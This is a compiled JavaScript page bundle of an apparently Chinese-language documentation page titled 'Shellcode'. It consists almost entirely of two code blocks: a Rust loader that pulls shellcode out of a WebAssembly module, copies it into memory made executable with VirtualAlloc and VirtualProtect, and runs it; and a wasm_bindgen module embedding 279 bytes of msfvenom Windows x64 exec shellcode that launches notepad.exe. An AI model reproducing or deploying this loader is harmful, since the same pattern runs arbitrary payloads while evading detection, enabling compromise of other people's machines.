import{_ as o,K as c,L as l,M as n,N as t,a5 as s,W as u,F as a}from"./framework-edebdfe1.js";const i={},k=n("h1",{id:"shellcode",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#shellcode","aria-hidden":"true"},"#"),t(" Shellcode")],-1),r={href:"https://rustwasm.github.io/wasm-pack/installer/",target:"_blank",rel:"noopener noreferrer"},d=u(`<div class="language-rust line-numbers-mode" data-ext="rs"><pre class="language-rust"><code><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token punctuation">{</span>
    fs<span class="token punctuation">,</span>
    <span class="token namespace">ptr<span class="token punctuation">::</span></span><span class="token punctuation">{</span>copy<span class="token punctuation">,</span> null_mut<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">wasmtime<span class="token punctuation">::</span></span><span class="token punctuation">{</span><span class="token keyword">self</span><span class="token punctuation">,</span> <span class="token class-name">Engine</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token punctuation">,</span> <span class="token class-name">Instance</span><span class="token punctuation">,</span> <span class="token class-name">Module</span><span class="token punctuation">,</span> <span class="token class-name">Store</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">windows<span class="token punctuation">::</span></span><span class="token class-name">Win32</span><span class="token punctuation">::</span><span class="token class-name">System</span><span class="token punctuation">::</span><span class="token class-name">Memory</span><span class="token punctuation">::</span><span class="token punctuation">{</span>
    <span class="token class-name">VirtualAlloc</span><span class="token punctuation">,</span> <span class="token class-name">VirtualProtect</span><span class="token punctuation">,</span> <span class="token constant">MEM_COMMIT</span><span class="token punctuation">,</span> <span class="token constant">MEM_RESERVE</span><span class="token punctuation">,</span> <span class="token constant">PAGE_EXECUTE_READWRITE</span><span class="token punctuation">,</span>
    <span class="token constant">PAGE_PROTECTION_FLAGS</span><span class="token punctuation">,</span> <span class="token constant">PAGE_READWRITE</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> engine <span class="token operator">=</span> <span class="token class-name">Engine</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> store <span class="token operator">=</span> <span class="token class-name">Store</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>engine<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> wasm_binary <span class="token operator">=</span> <span class="token namespace">fs<span class="token punctuation">::</span></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">&quot;shell.wat&quot;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// Webassembly file containing the shellcode</span>
    <span class="token keyword">let</span> module <span class="token operator">=</span> <span class="token class-name">Module</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>engine<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wasm_binary<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> instance <span class="token operator">=</span> <span class="token class-name">Instance</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> store<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> get_wasm_mem_size <span class="token operator">=</span> instance<span class="token punctuation">.</span><span class="token function">get_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> store<span class="token punctuation">,</span> <span class="token string">&quot;get_wasm_mem_size&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Not found get_wasm_mem_size&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> read_wasm_at_index <span class="token operator">=</span> instance<span class="token punctuation">.</span><span class="token function">get_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> store<span class="token punctuation">,</span> <span class="token string">&quot;read_wasm_at_index&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Not found read_wasm_at_index&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> read_wasm_at_index <span class="token operator">=</span> read_wasm_at_index<span class="token punctuation">.</span><span class="token function">typed</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token keyword">u32</span><span class="token punctuation">,</span> <span class="token keyword">u32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>store<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> get_wasm_mem_size <span class="token operator">=</span> get_wasm_mem_size<span class="token punctuation">.</span><span class="token function">typed</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">u32</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>store<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> buffer_size<span class="token punctuation">:</span> <span class="token keyword">u32</span> <span class="token operator">=</span> get_wasm_mem_size<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> store<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> shellcode_buffer<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span> buffer_size <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>buffer_size <span class="token punctuation">{</span>
        <span class="token keyword">let</span> value <span class="token operator">=</span> read_wasm_at_index<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> store<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        shellcode_buffer<span class="token punctuation">[</span>i <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">]</span> <span class="token operator">=</span> value <span class="token keyword">as</span> <span class="token keyword">u8</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">unsafe</span> <span class="token punctuation">{</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Memory Allocation Being Performed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> shellcode_addr <span class="token operator">=</span> <span class="token class-name">VirtualAlloc</span><span class="token punctuation">(</span>
            <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token function">null_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            shellcode_buffer<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token constant">MEM_COMMIT</span> <span class="token operator">|</span> <span class="token constant">MEM_RESERVE</span><span class="token punctuation">,</span>
            <span class="token constant">PAGE_READWRITE</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Copying a Shellcode To Target Memory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">copy</span><span class="token punctuation">(</span>
            shellcode_buffer<span class="token punctuation">.</span><span class="token function">as_ptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> _<span class="token punctuation">,</span>
            shellcode_addr<span class="token punctuation">,</span>
            shellcode_buffer<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Changing Page Permissions&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> old_protection<span class="token punctuation">:</span> <span class="token constant">PAGE_PROTECTION_FLAGS</span> <span class="token operator">=</span> <span class="token constant">PAGE_PROTECTION_FLAGS</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VirtualProtect</span><span class="token punctuation">(</span>
            shellcode_addr<span class="token punctuation">,</span>
            shellcode_buffer<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token constant">PAGE_EXECUTE_READWRITE</span><span class="token punctuation">,</span>
            <span class="token operator">&amp;</span><span class="token keyword">mut</span> old_protection<span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap_or_else</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>e<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">{</span>
            <span class="token macro property">panic!</span><span class="token punctuation">(</span><span class="token string">&quot;[!] VirtualProtect Failed With Error: {e}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> func<span class="token punctuation">:</span> <span class="token keyword">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token namespace">std<span class="token punctuation">::</span>mem<span class="token punctuation">::</span></span><span class="token function">transmute</span><span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-shellcode line-numbers-mode" data-ext="shellcode"><pre class="language-shellcode"><code>use wasm_bindgen::prelude::*;

// Enter the shellcode size
const WASM_MEMORY_BUFFER_SIZE: usize = 279;

// msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

#[wasm_bindgen]
pub fn get_wasm_mem_size() -&gt; usize {
    return WASM_MEMORY_BUFFER_SIZE;
}

#[wasm_bindgen]
pub fn read_wasm_at_index(index: usize) -&gt; u8 {
    let value: u8;
    value = WASM_MEMORY_BUFFER[index];
    return value;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function x(m,v){const p=a("ExternalLinkIcon"),e=a("DocsAD");return c(),l("div",null,[k,n("ul",null,[n("li",null,[n("a",r,[t("wasm-pack下载"),s(p)])])]),s(e),d])}const _=o(i,[["render",x],["__file","shellcode.html.vue"]]);export{_ as default};
